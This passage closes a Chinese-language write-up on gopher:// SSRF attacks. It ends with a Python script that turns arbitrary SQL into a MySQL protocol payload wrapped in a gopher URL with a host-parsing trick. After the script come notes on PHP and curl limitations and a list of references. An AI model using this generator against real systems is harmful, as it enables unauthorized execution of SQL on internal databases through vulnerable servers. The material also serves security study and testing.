parser.add_argument("-t", "--target", dest="host", help="database host", default="127.0.0.1")
parser.add_argument("-p", "--password", help="database password default null", default="")
parser.add_argument("-P", "--payload", help="the sql you want to execute with out ';'", required=True)
parser.add_argument("-v", "--verbose", help="dump details", action="store_true")
parser.add_argument("-c", "--connect", help="connect your database", action="store_true")
parser.add_argument("--sql", help="print generated sql", action="store_true")



if __name__ == '__main__':
    args = parser.parse_args()
    DEBUG = 0
    if args.verbose:
        DEBUG = 1
    #default database user m4st3r_ov3rl0rd
    protocal = Protocal(args.host, '3306', args.user, args.password, args.database)
    if args.connect:
        protocal.connect()
        result = protocal.execute(args.payload)
        print '-'*100
        print '| sql:',args.payload,'|'
        print '-'*100
        print 'Result: ',result
        print '-'*100

    payload = protocal.get_payload(args.payload, 1000, args.verbose)+'\x00'*4
    print '\nPayload:'
    print ' '*5,'gopher://foo@[cafebabe.cf]@yolo.com:3306/A'+quote(payload)
```





## 0x05 系统局限性

- 大部分 PHP 并不会开启 fopen 的 gopher wrapper

- file_get_contents 的 gopher 协议不能 URLencode

- file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败

- PHP 的 curl 默认不 follow 302 跳转

- curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用



\- **参考** \-

\[1\] [Gopher - Wiki](https://zh.wikipedia.org/zh-hans/Gopher_(%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE))

\[2\] [Do Evil Things with gopher:// - Ricter](http://drops.xmd5.com/static/drops/tips-16357.html)

\[3\] [对万金油gopher协议的理解与应用](https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/)

\[4\] [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

\[5\] [Gopher攻击FastCGI的小结 - 0verWatch](https://0verwatch.top/Gopher-fastcgi.html)






